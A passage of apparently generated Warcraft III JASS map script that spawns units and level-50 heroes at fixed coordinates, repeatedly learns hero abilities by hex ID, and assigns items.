call SelectHeroSkill(Hu,$41313653)
call SelectHeroSkill(Hu,$41313653)
call SelectHeroSkill(Hu,$41313653)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$4131364E)
call SelectHeroSkill(Hu,$4131364E)
call SelectHeroSkill(Hu,$4131364E)
call SelectHeroSkill(Hu,$4131364E)
call SelectHeroSkill(Hu,$4131364E)
call SelectHeroSkill(Hu,$4131364E)
call SelectHeroSkill(Hu,$4131364E)
call SelectHeroSkill(Hu,$4131364E)
call SelectHeroSkill(Hu,$4131364E)
call SelectHeroSkill(Hu,$4131364E)
call IssueImmediateOrder(Hu,"")
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$4131364F)
call SelectHeroSkill(Hu,$4131364F)
call SelectHeroSkill(Hu,$4131364F)
call SelectHeroSkill(Hu,$4131364F)
call SelectHeroSkill(Hu,$4131364F)
call SelectHeroSkill(Hu,$4131364F)
call SelectHeroSkill(Hu,$4131364F)
call SelectHeroSkill(Hu,$4131364F)
call SelectHeroSkill(Hu,$4131364F)
call SelectHeroSkill(Hu,$4131364F)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41313651)
call SelectHeroSkill(Hu,$41313651)
call SelectHeroSkill(Hu,$41313651)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$4130394F)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41304142)
call SelectHeroSkill(Hu,$41304142)
call SelectHeroSkill(Hu,$41304142)
call SelectHeroSkill(Hu,$41304142)
call SelectHeroSkill(Hu,$41304142)
call SelectHeroSkill(Hu,$41304142)
call SelectHeroSkill(Hu,$41304142)
call SelectHeroSkill(Hu,$41304142)
call SelectHeroSkill(Hu,$41304142)
call SelectHeroSkill(Hu,$41304142)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41303950)
call SelectHeroSkill(Hu,$41303950)
call SelectHeroSkill(Hu,$41303950)
call SelectHeroSkill(Hu,$41303950)
call SelectHeroSkill(Hu,$41303950)
call SelectHeroSkill(Hu,$41303950)
call SelectHeroSkill(Hu,$41303950)
call SelectHeroSkill(Hu,$41303950)
call SelectHeroSkill(Hu,$41303950)
call SelectHeroSkill(Hu,$41303950)
call IssueImmediateOrder(Hu,"")
call UnitAddItemToSlotById(Hu,$49305750,0)
set Hu=CreateUnit(Ht,$68777432,-14170.5,190.6,102.862)
set Hu=CreateUnit(Ht,$48303637,-15901.7,14807.6,270.)
call SetHeroLevel(Hu,50,false)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41304348)
call SelectHeroSkill(Hu,$41304348)
call SelectHeroSkill(Hu,$41304348)
call SelectHeroSkill(Hu,$41304348)
call SelectHeroSkill(Hu,$41304348)
call SelectHeroSkill(Hu,$41304348)
call SelectHeroSkill(Hu,$41304348)
call SelectHeroSkill(Hu,$41304348)
call SelectHeroSkill(Hu,$41304348)
call SelectHeroSkill(Hu,$41304348)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41304342)
call SelectHeroSkill(Hu,$41304342)
call SelectHeroSkill(Hu,$41304342)
call SelectHeroSkill(Hu,$41304342)
call SelectHeroSkill(Hu,$41304342)
call SelectHeroSkill(Hu,$41304342)
call SelectHeroSkill(Hu,$41304342)
call SelectHeroSkill(Hu,$41304342)
call SelectHeroSkill(Hu,$41304342)
call SelectHeroSkill(Hu,$41304342)
call IssueImmediateOrder(Hu,"")
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41304653)
call SelectHeroSkill(Hu,$41304653)
call SelectHeroSkill(Hu,$41304653)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$4131334D)
call SelectHeroSkill(Hu,$4131334D)
call SelectHeroSkill(Hu,$4131334D)
call SelectHeroSkill(Hu,$4131334D)
call SelectHeroSkill(Hu,$4131334D)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$4131334C)
call SelectHeroSkill(Hu,$4131334C)
call SelectHeroSkill(Hu,$4131334C)
call SelectHeroSkill(Hu,$4131334C)
call SelectHeroSkill(Hu,$4131334C)
call SelectHeroSkill(Hu,$4131334C)
call SelectHeroSkill(Hu,$4131334C)
call SelectHeroSkill(Hu,$4131334C)
call SelectHeroSkill(Hu,$4131334C)
call SelectHeroSkill(Hu,$4131334C)
call IssueImmediateOrder(Hu,"")
call UnitAddItemToSlotById(Hu,$49305752,0)
set Hu=CreateUnit(Ht,$4830354E,-16038.,14541.1,270.)
call SetHeroLevel(Hu,50,false)
call SelectHeroSkill(Hu,$41304C57)
call SelectHeroSkill(Hu,$41304C57)
call SelectHeroSkill(Hu,$41304C57)
call SelectHeroSkill(Hu,$41304C57)
call SelectHeroSkill(Hu,$41304C57)
call SelectHeroSkill(Hu,$41304C57)
call SelectHeroSkill(Hu,$41304C57)
call SelectHeroSkill(Hu,$41304C57)
call SelectHeroSkill(Hu,$41304C57)
call SelectHeroSkill(Hu,$41304C57)
call IssueImmediateOrder(Hu,"")
call UnitAddItemToSlotById(Hu,$49313039,0)
set Hu=CreateUnit(Ht,$48303638,-16180.1,14804.6,270.)
call SetHeroLevel(Hu,50,false)
call SelectHeroSkill(Hu,$41313155)
call SelectHeroSkill(Hu,$41313155)
call SelectHeroSkill(Hu,$41313155)
call SelectHeroSkill(Hu,$41313155)
call SelectHeroSkill(Hu,$41313155)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41313142)
call SelectHeroSkill(Hu,$41313142)
call SelectHeroSkill(Hu,$41313142)
call SelectHeroSkill(Hu,$41313142)
call SelectHeroSkill(Hu,$41313142)
call SelectHeroSkill(Hu,$41313142)
call SelectHeroSkill(Hu,$41313142)
call SelectHeroSkill(Hu,$41313142)
call SelectHeroSkill(Hu,$41313142)
call SelectHeroSkill(Hu,$41313142)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41313147)
call SelectHeroSkill(Hu,$41313147)
call SelectHeroSkill(Hu,$41313147)
call SelectHeroSkill(Hu,$41313147)
call SelectHeroSkill(Hu,$41313147)
call SelectHeroSkill(Hu,$41313147)
call SelectHeroSkill(Hu,$41313147)
call SelectHeroSkill(Hu,$41313147)
call SelectHeroSkill(Hu,$41313147)
call SelectHeroSkill(Hu,$41313147)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41313148)
call SelectHeroSkill(Hu,$41313148)
call SelectHeroSkill(Hu,$41313148)
call SelectHeroSkill(Hu,$41313148)
call SelectHeroSkill(Hu,$41313148)
call SelectHeroSkill(Hu,$41313148)
call SelectHeroSkill(Hu,$41313148)
call SelectHeroSkill(Hu,$41313148)
call SelectHeroSkill(Hu,$41313148)
call SelectHeroSkill(Hu,$41313148)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41314152)
call SelectHeroSkill(Hu,$41314152)
call SelectHeroSkill(Hu,$41314152)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41304539)
call SelectHeroSkill(Hu,$41304539)
call SelectHeroSkill(Hu,$41304539)
call SelectHeroSkill(Hu,$41304539)
call SelectHeroSkill(Hu,$41304539)
call SelectHeroSkill(Hu,$41304539)
call SelectHeroSkill(Hu,$41304539)
call SelectHeroSkill(Hu,$41304539)
call SelectHeroSkill(Hu,$41304539)
call SelectHeroSkill(Hu,$41304539)
call IssueImmediateOrder(Hu,"")
call UnitAddItemToSlotById(Hu,$49305734,0)
set KJ=CreateUnit(Ht,$686B6E69,-15764.2,-1546.6,60.807)
set Hu=CreateUnit(Ht,$48303639,-15741.6,14803.4,270.)
call SetHeroLevel(Hu,50,false)
call SelectHeroSkill(Hu,$4130304A)
call SelectHeroSkill(Hu,$4130304A)
call SelectHeroSkill(Hu,$4130304A)
call SelectHeroSkill(Hu,$4130304A)
call SelectHeroSkill(Hu,$4130304A)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$4130304F)
call SelectHeroSkill(Hu,$4130304F)
call SelectHeroSkill(Hu,$4130304F)
call SelectHeroSkill(Hu,$4130304F)
call SelectHeroSkill(Hu,$4130304F)
call SelectHeroSkill(Hu,$4130304F)
call SelectHeroSkill(Hu,$4130304F)
call SelectHeroSkill(Hu,$4130304F)
call SelectHeroSkill(Hu,$4130304F)
call SelectHeroSkill(Hu,$4130304F)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41303036)
call SelectHeroSkill(Hu,$41303036)
call SelectHeroSkill(Hu,$41303036)
call SelectHeroSkill(Hu,$41303036)
call SelectHeroSkill(Hu,$41303036)
call SelectHeroSkill(Hu,$41303036)
call SelectHeroSkill(Hu,$41303036)
call SelectHeroSkill(Hu,$41303036)
call SelectHeroSkill(Hu,$41303036)
call SelectHeroSkill(Hu,$41303036)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41303456)
call SelectHeroSkill(Hu,$41303456)
call SelectHeroSkill(Hu,$41303456)
call SelectHeroSkill(Hu,$41303456)
call SelectHeroSkill(Hu,$41303456)
call SelectHeroSkill(Hu,$41303456)
call SelectHeroSkill(Hu,$41303456)
call SelectHeroSkill(Hu,$41303456)
call SelectHeroSkill(Hu,$41303456)
call SelectHeroSkill(Hu,$41303456)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41304753)
call SelectHeroSkill(Hu,$41304753)
call SelectHeroSkill(Hu,$41304753)
call IssueImmediateOrder(Hu,"")
call UnitAddItemToSlotById(Hu,$49305747,0)
set Hu=CreateUnit(Ht,$68777432,-11389.4,-1016.4,102.862)
set Hu=CreateUnit(Ht,$68777432,-12307.,-831.3,306.719)
set Hu=CreateUnit(Ht,$68777432,-11685.1,-818.9,235.48)
set Hu=CreateUnit(Ht,$686D7072,-12075.3,-847.4,64.6)
set Hu=CreateUnit(Ht,$686D7072,-11182.9,-560.,176.17)
set Hu=CreateUnit(Ht,$686D7072,-13465.5,-391.3,328.646)
set KK=CreateUnit(Ht,$6E676972,-12326.5,839.5,242.12)
set Hu=CreateUnit(Ht,$6E686566,-13091.6,314.3,133.44)
set KL=CreateUnit(Ht,$6E766C6B,-13176.3,218.7,92.694)
set Hu=CreateUnit(Ht,$6E766C6B,-13673.7,2312.8,228.314)
set Hu=CreateUnit(Ht,$6E766C6B,-13732.9,2234.5,114.634)
set Hu=CreateUnit(Ht,$6F30304B,-11417.3,2036.3,236.003)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
set KM=CreateUnit(Ht,$6530304F,6388.5,1178.2,271.402)
set I2=GetUnitState(KM,UNIT_STATE_LIFE)
call SetUnitState(KM,UNIT_STATE_LIFE,.01*I2)
set KN=CreateUnit(Ht,$6E766C6B,-13828.2,2230.8,70.387)
set KO=CreateUnit(Ht,$6E766C32,-13854.6,2318.2,321.842)
set Hu=CreateUnit(Ht,$48303641,-15588.1,14810.1,270.)
call SetHeroLevel(Hu,50,false)
call SelectHeroSkill(Hu,$41305551)
call SelectHeroSkill(Hu,$41305551)
call SelectHeroSkill(Hu,$41305551)
call SelectHeroSkill(Hu,$41305551)
call SelectHeroSkill(Hu,$41305551)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$4130554F)
call SelectHeroSkill(Hu,$4130554F)
call SelectHeroSkill(Hu,$4130554F)
call SelectHeroSkill(Hu,$4130554F)
call SelectHeroSkill(Hu,$4130554F)
call SelectHeroSkill(Hu,$4130554F)
call SelectHeroSkill(Hu,$4130554F)
call SelectHeroSkill(Hu,$4130554F)
call SelectHeroSkill(Hu,$4130554F)
call SelectHeroSkill(Hu,$4130554F)
call IssueImmediateOrder(Hu,"")
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$4130554C)
call SelectHeroSkill(Hu,$4130554C)
call SelectHeroSkill(Hu,$4130554C)
call SelectHeroSkill(Hu,$4130554C)
call SelectHeroSkill(Hu,$4130554C)
call SelectHeroSkill(Hu,$4130554C)
call SelectHeroSkill(Hu,$4130554C)
call SelectHeroSkill(Hu,$4130554C)
call SelectHeroSkill(Hu,$4130554C)
call SelectHeroSkill(Hu,$4130554C)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41305550)
call SelectHeroSkill(Hu,$41305550)
call SelectHeroSkill(Hu,$41305550)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41313955)
call SelectHeroSkill(Hu,$41313955)
call SelectHeroSkill(Hu,$41313955)
call SelectHeroSkill(Hu,$41313955)
call SelectHeroSkill(Hu,$41313955)
call SelectHeroSkill(Hu,$41313955)
call SelectHeroSkill(Hu,$41313955)
call SelectHeroSkill(Hu,$41313955)
call SelectHeroSkill(Hu,$41313955)
call SelectHeroSkill(Hu,$41313955)
call IssueImmediateOrder(Hu,"")
call UnitAddItemToSlotById(Hu,$49305753,0)
set Hu=CreateUnit(Ht,$6868646C,-15162.8,-1553.2,236.41)
set Hu=CreateUnit(Ht,$6868646C,-14989.,-1555.4,236.41)
set KP=CreateUnit(Ht,$6E76696C,-14690.8,-1121.7,151.621)
set KQ=CreateUnit(Ht,$6E766C77,-14718.8,-1017.,193.183)
set Hu=CreateUnit(Ht,$48303642,-15457.8,14804.1,270.)
call SetHeroLevel(Hu,50,false)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41303649)
call SelectHeroSkill(Hu,$41303649)
call SelectHeroSkill(Hu,$41303649)
call SelectHeroSkill(Hu,$41303649)
call SelectHeroSkill(Hu,$41303649)
call SelectHeroSkill(Hu,$41303649)
call SelectHeroSkill(Hu,$41303649)
call SelectHeroSkill(Hu,$41303649)
call SelectHeroSkill(Hu,$41303649)
call SelectHeroSkill(Hu,$41303649)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$4130364B)
call SelectHeroSkill(Hu,$4130364B)
call SelectHeroSkill(Hu,$4130364B)
call SelectHeroSkill(Hu,$4130364B)
call SelectHeroSkill(Hu,$4130364B)
call SelectHeroSkill(Hu,$4130364B)
call SelectHeroSkill(Hu,$4130364B)
call SelectHeroSkill(Hu,$4130364B)
call SelectHeroSkill(Hu,$4130364B)
call SelectHeroSkill(Hu,$4130364B)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$4130364A)
call SelectHeroSkill(Hu,$4130364A)
call SelectHeroSkill(Hu,$4130364A)
call SelectHeroSkill(Hu,$4130364A)
call SelectHeroSkill(Hu,$4130364A)
call SelectHeroSkill(Hu,$4130364A)
call SelectHeroSkill(Hu,$4130364A)
call SelectHeroSkill(Hu,$4130364A)
call SelectHeroSkill(Hu,$4130364A)
call SelectHeroSkill(Hu,$4130364A)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41304C32)
call SelectHeroSkill(Hu,$41304C32)
call SelectHeroSkill(Hu,$41304C32)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41303842)
call SelectHeroSkill(Hu,$41303842)
call SelectHeroSkill(Hu,$41303842)
call SelectHeroSkill(Hu,$41303842)
call SelectHeroSkill(Hu,$41303842)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41304B48)
call SelectHeroSkill(Hu,$41304B48)
call SelectHeroSkill(Hu,$41304B48)
call SelectHeroSkill(Hu,$41304B48)
call SelectHeroSkill(Hu,$41304B48)
call SelectHeroSkill(Hu,$41304B48)
call SelectHeroSkill(Hu,$41304B48)
call SelectHeroSkill(Hu,$41304B48)
call SelectHeroSkill(Hu,$41304B48)
call SelectHeroSkill(Hu,$41304B48)
call IssueImmediateOrder(Hu,"")
call UnitAddItemToSlotById(Hu,$4930574D,0)
set KR=CreateUnit(Ht,$4F726578,-12987.4,-848.,54.469)
call SetUnitState(KR,UNIT_STATE_MANA,0)
set KS=CreateUnit(Ht,$6E677A34,-13258.6,-859.9,93.754)
set KT=CreateUnit(Ht,$6E677A34,-12744.5,-843.2,98.91)
set Hu=CreateUnit(Ht,$48303643,-15321.8,14788.9,270.)
call SetHeroLevel(Hu,50,false)
call SelectHeroSkill(Hu,$41304236)
call SelectHeroSkill(Hu,$41304236)
call SelectHeroSkill(Hu,$41304236)
call SelectHeroSkill(Hu,$41304236)
call SelectHeroSkill(Hu,$41304236)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$4130454A)
call SelectHeroSkill(Hu,$4130454A)
call SelectHeroSkill(Hu,$4130454A)
call SelectHeroSkill(Hu,$4130454A)
call SelectHeroSkill(Hu,$4130454A)
call SelectHeroSkill(Hu,$4130454A)
call SelectHeroSkill(Hu,$4130454A)
call SelectHeroSkill(Hu,$4130454A)
call SelectHeroSkill(Hu,$4130454A)
call SelectHeroSkill(Hu,$4130454A)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41305549)
call SelectHeroSkill(Hu,$41305549)
call SelectHeroSkill(Hu,$41305549)
call SelectHeroSkill(Hu,$41305549)
call SelectHeroSkill(Hu,$41305549)
call SelectHeroSkill(Hu,$41305549)
call SelectHeroSkill(Hu,$41305549)
call SelectHeroSkill(Hu,$41305549)
call SelectHeroSkill(Hu,$41305549)
call SelectHeroSkill(Hu,$41305549)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41303855)
call SelectHeroSkill(Hu,$41303855)
call SelectHeroSkill(Hu,$41303855)
call SelectHeroSkill(Hu,$41303855)
call SelectHeroSkill(Hu,$41303855)
call SelectHeroSkill(Hu,$41303855)
call SelectHeroSkill(Hu,$41303855)
call SelectHeroSkill(Hu,$41303855)
call SelectHeroSkill(Hu,$41303855)
call SelectHeroSkill(Hu,$41303855)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41305638)
call SelectHeroSkill(Hu,$41305638)
call SelectHeroSkill(Hu,$41305638)
call IssueImmediateOrder(Hu,"")
call UnitAddItemToSlotById(Hu,$49305741,0)
set KU=CreateUnit(Ht,$48616D67,-11254.7,-781.5,132.047)
call SetUnitState(KU,UNIT_STATE_MANA,0)
set Hu=CreateUnit(Ht,$48303644,-15193.,14778.5,270.)
call SetHeroLevel(Hu,50,false)
call SelectHeroSkill(Hu,$41303943)
call SelectHeroSkill(Hu,$41303943)
call SelectHeroSkill(Hu,$41303943)
call SelectHeroSkill(Hu,$41303943)
call SelectHeroSkill(Hu,$41303943)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41303934)
call SelectHeroSkill(Hu,$41303934)
call SelectHeroSkill(Hu,$41303934)
call SelectHeroSkill(Hu,$41303934)
call SelectHeroSkill(Hu,$41303934)
call SelectHeroSkill(Hu,$41303934)
call SelectHeroSkill(Hu,$41303934)
call SelectHeroSkill(Hu,$41303934)
call SelectHeroSkill(Hu,$41303934)
call SelectHeroSkill(Hu,$41303934)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41303935)
call SelectHeroSkill(Hu,$41303935)
call SelectHeroSkill(Hu,$41303935)
call SelectHeroSkill(Hu,$41303935)
call SelectHeroSkill(Hu,$41303935)
call SelectHeroSkill(Hu,$41303935)
call SelectHeroSkill(Hu,$41303935)
call SelectHeroSkill(Hu,$41303935)
call SelectHeroSkill(Hu,$41303935)
call SelectHeroSkill(Hu,$41303935)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41313348)
call SelectHeroSkill(Hu,$41313348)
call SelectHeroSkill(Hu,$41313348)
call SelectHeroSkill(Hu,$41313348)
call SelectHeroSkill(Hu,$41313348)
call SelectHeroSkill(Hu,$41313348)
call SelectHeroSkill(Hu,$41313348)
call SelectHeroSkill(Hu,$41313348)
call SelectHeroSkill(Hu,$41313348)
call SelectHeroSkill(Hu,$41313348)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41305350)
call SelectHeroSkill(Hu,$41305350)
call SelectHeroSkill(Hu,$41305350)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41303330)
call SelectHeroSkill(Hu,$41303330)
call SelectHeroSkill(Hu,$41303330)
call SelectHeroSkill(Hu,$41303330)
call SelectHeroSkill(Hu,$41303330)
call IssueImmediateOrder(Hu,"")
call UnitAddItemToSlotById(Hu,$49305742,0)
set Hu=CreateUnit(Ht,$48303645,-15481.9,14324.4,270.)
call SetHeroLevel(Hu,50,false)
call SelectHeroSkill(Hu,$4130345A)
call SelectHeroSkill(Hu,$4130345A)
call SelectHeroSkill(Hu,$4130345A)
call SelectHeroSkill(Hu,$4130345A)
call SelectHeroSkill(Hu,$4130345A)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41303454)
call SelectHeroSkill(Hu,$41303454)
call SelectHeroSkill(Hu,$41303454)
call SelectHeroSkill(Hu,$41303454)
call SelectHeroSkill(Hu,$41303454)
call SelectHeroSkill(Hu,$41303454)
call SelectHeroSkill(Hu,$41303454)
call SelectHeroSkill(Hu,$41303454)
call SelectHeroSkill(Hu,$41303454)
call SelectHeroSkill(Hu,$41303454)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41313333)
call SelectHeroSkill(Hu,$41313333)
call SelectHeroSkill(Hu,$41313333)
call SelectHeroSkill(Hu,$41313333)
call SelectHeroSkill(Hu,$41313333)
call SelectHeroSkill(Hu,$41313333)
call SelectHeroSkill(Hu,$41313333)
call SelectHeroSkill(Hu,$41313333)
call SelectHeroSkill(Hu,$41313333)
call SelectHeroSkill(Hu,$41313333)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41303933)
call SelectHeroSkill(Hu,$41303933)
call SelectHeroSkill(Hu,$41303933)
call SelectHeroSkill(Hu,$41303933)
call SelectHeroSkill(Hu,$41303933)
call SelectHeroSkill(Hu,$41303933)
call SelectHeroSkill(Hu,$41303933)
call SelectHeroSkill(Hu,$41303933)
call SelectHeroSkill(Hu,$41303933)
call SelectHeroSkill(Hu,$41303933)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41313336)
call SelectHeroSkill(Hu,$41313336)
call SelectHeroSkill(Hu,$41313336)
call IssueImmediateOrder(Hu,"")
call UnitAddItemToSlotById(Hu,$49305737,0)
set Hu=CreateUnit(Ht,$68686573,-15587.1,-1617.5,76.84)
set KV=CreateUnit(Ht,$6E726F67,-12400.2,2319.,294.515)
set Hu=CreateUnit(Ht,$48303646,-15896.8,14548.9,270.)
call SetHeroLevel(Hu,50,false)
call SelectHeroSkill(Hu,$41303451)
call SelectHeroSkill(Hu,$41303451)
call SelectHeroSkill(Hu,$41303451)
call SelectHeroSkill(Hu,$41303451)
call SelectHeroSkill(Hu,$41303451)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$4130524A)
call SelectHeroSkill(Hu,$4130524A)
call SelectHeroSkill(Hu,$4130524A)
call SelectHeroSkill(Hu,$4130524A)
call SelectHeroSkill(Hu,$4130524A)
call SelectHeroSkill(Hu,$4130524A)
call SelectHeroSkill(Hu,$4130524A)
call SelectHeroSkill(Hu,$4130524A)
call SelectHeroSkill(Hu,$4130524A)
call SelectHeroSkill(Hu,$4130524A)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$4130524B)
call SelectHeroSkill(Hu,$4130524B)
call SelectHeroSkill(Hu,$4130524B)
call SelectHeroSkill(Hu,$4130524B)
call SelectHeroSkill(Hu,$4130524B)
call SelectHeroSkill(Hu,$4130524B)
call SelectHeroSkill(Hu,$4130524B)
call SelectHeroSkill(Hu,$4130524B)
call SelectHeroSkill(Hu,$4130524B)
call SelectHeroSkill(Hu,$4130524B)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$4130524C)
call SelectHeroSkill(Hu,$4130524C)
call SelectHeroSkill(Hu,$4130524C)
call SelectHeroSkill(Hu,$4130524C)
call SelectHeroSkill(Hu,$4130524C)
call SelectHeroSkill(Hu,$4130524C)
call SelectHeroSkill(Hu,$4130524C)
call SelectHeroSkill(Hu,$4130524C)
call SelectHeroSkill(Hu,$4130524C)
call SelectHeroSkill(Hu,$4130524C)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41304657)
call SelectHeroSkill(Hu,$41304657)
call SelectHeroSkill(Hu,$41304657)
call IssueImmediateOrder(Hu,"")
call UnitAddItemToSlotById(Hu,$49305751,0)
set Hu=CreateUnit(Ht,$48303647,-15055.2,14765.7,270.)
call SetHeroLevel(Hu,50,false)
call SetUnitState(Hu,UNIT_STATE_MANA,0)
call SelectHeroSkill(Hu,$41303046)
call SelectHeroSkill(Hu,$41303046)
call SelectHeroSkill(Hu,$41303046)
call SelectHeroSkill(Hu,$41303046)
call SelectHeroSkill(Hu,$41303046)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41303047)
call SelectHeroSkill(Hu,$41303047)
call SelectHeroSkill(Hu,$41303047)
call SelectHeroSkill(Hu,$41303047)
call SelectHeroSkill(Hu,$41303047)
call SelectHeroSkill(Hu,$41303047)
call SelectHeroSkill(Hu,$41303047)
call SelectHeroSkill(Hu,$41303047)
call SelectHeroSkill(Hu,$41303047)
call SelectHeroSkill(Hu,$41303047)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41303045)
call SelectHeroSkill(Hu,$41303045)
call SelectHeroSkill(Hu,$41303045)
call SelectHeroSkill(Hu,$41303045)
call SelectHeroSkill(Hu,$41303045)
call SelectHeroSkill(Hu,$41303045)
call SelectHeroSkill(Hu,$41303045)
call SelectHeroSkill(Hu,$41303045)
call SelectHeroSkill(Hu,$41303045)
call SelectHeroSkill(Hu,$41303045)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$53303057)
call SelectHeroSkill(Hu,$53303057)
call SelectHeroSkill(Hu,$53303057)
call SelectHeroSkill(Hu,$53303057)
call SelectHeroSkill(Hu,$53303057)
call SelectHeroSkill(Hu,$53303057)
call SelectHeroSkill(Hu,$53303057)
call SelectHeroSkill(Hu,$53303057)
call SelectHeroSkill(Hu,$53303057)
call SelectHeroSkill(Hu,$53303057)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41313044)
call SelectHeroSkill(Hu,$41313044)
call SelectHeroSkill(Hu,$41313044)
call IssueImmediateOrder(Hu,"")
call UnitAddItemToSlotById(Hu,$4930574A,0)
set Hu=CreateUnit(Ht,$48303648,-16044.7,14350.1,270.)
call SetHeroLevel(Hu,50,false)
call SelectHeroSkill(Hu,$4131324F)
call SelectHeroSkill(Hu,$4131324F)
call SelectHeroSkill(Hu,$4131324F)
call SelectHeroSkill(Hu,$4131324F)
call SelectHeroSkill(Hu,$4131324F)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41305432)
call SelectHeroSkill(Hu,$41305432)
call SelectHeroSkill(Hu,$41305432)
call SelectHeroSkill(Hu,$41305432)
call SelectHeroSkill(Hu,$41305432)
call SelectHeroSkill(Hu,$41305432)
call SelectHeroSkill(Hu,$41305432)
call SelectHeroSkill(Hu,$41305432)
call SelectHeroSkill(Hu,$41305432)
call SelectHeroSkill(Hu,$41305432)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41313751)
call SelectHeroSkill(Hu,$41313751)
call SelectHeroSkill(Hu,$41313751)
call SelectHeroSkill(Hu,$41313751)
call SelectHeroSkill(Hu,$41313751)
call SelectHeroSkill(Hu,$41313751)
call SelectHeroSkill(Hu,$41313751)
call SelectHeroSkill(Hu,$41313751)
call SelectHeroSkill(Hu,$41313751)
call SelectHeroSkill(Hu,$41313751)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$53303052)
call SelectHeroSkill(Hu,$53303052)
call SelectHeroSkill(Hu,$53303052)
call SelectHeroSkill(Hu,$53303052)
call SelectHeroSkill(Hu,$53303052)
call SelectHeroSkill(Hu,$53303052)
call SelectHeroSkill(Hu,$53303052)
call SelectHeroSkill(Hu,$53303052)
call SelectHeroSkill(Hu,$53303052)
call SelectHeroSkill(Hu,$53303052)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$4130344E)
call SelectHeroSkill(Hu,$4130344E)
call SelectHeroSkill(Hu,$4130344E)
call IssueImmediateOrder(Hu,"")
call UnitAddItemToSlotById(Hu,$49305748,0)
set Hu=CreateUnit(Ht,$68686573,-15836.1,-1298.6,356.15)
set Hu=CreateUnit(Ht,$48303649,-15903.1,14345.6,270.)
call SetHeroLevel(Hu,50,false)
call SelectHeroSkill(Hu,$41303146)
call SelectHeroSkill(Hu,$41303146)
call SelectHeroSkill(Hu,$41303146)
call SelectHeroSkill(Hu,$41303146)
call SelectHeroSkill(Hu,$41303146)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41305236)
call SelectHeroSkill(Hu,$41305236)
call SelectHeroSkill(Hu,$41305236)
call SelectHeroSkill(Hu,$41305236)
call SelectHeroSkill(Hu,$41305236)
call SelectHeroSkill(Hu,$41305236)
call SelectHeroSkill(Hu,$41305236)
call SelectHeroSkill(Hu,$41305236)
call SelectHeroSkill(Hu,$41305236)
call SelectHeroSkill(Hu,$41305236)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41303032)
call SelectHeroSkill(Hu,$41303032)
call SelectHeroSkill(Hu,$41303032)
call SelectHeroSkill(Hu,$41303032)
call SelectHeroSkill(Hu,$41303032)
call SelectHeroSkill(Hu,$41303032)
call SelectHeroSkill(Hu,$41303032)
call SelectHeroSkill(Hu,$41303032)
call SelectHeroSkill(Hu,$41303032)
call SelectHeroSkill(Hu,$41303032)
call IssueImmediateOrder(Hu,"")
call SelectHeroSkill(Hu,$41303030)
call SelectHeroSkill(Hu,$41303030)
call SelectHeroSkill(Hu,$41303030)
call SelectHeroSkill(Hu,$41303030)
call SelectHeroSkill(Hu,$41303030)
